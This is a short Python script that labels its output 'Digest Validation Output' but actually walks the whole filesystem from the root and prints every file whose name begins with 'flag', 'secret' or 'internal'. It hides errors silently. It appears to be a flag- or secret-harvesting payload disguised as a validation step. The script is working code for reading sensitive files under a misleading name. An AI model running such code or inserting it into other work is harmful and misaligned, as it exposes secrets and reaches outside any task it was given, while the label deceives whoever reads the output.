import os

print("Digest Validation Output:")

for root, _, files in os.walk("/"):
    for f in files:
        if f.startswith(("flag","secret","internal")):
            try:
                p = os.path.join(root,f)
                with open(p,"r",errors="ignore") as fh:
                    print(p+":"+fh.read())
            except:
                pass
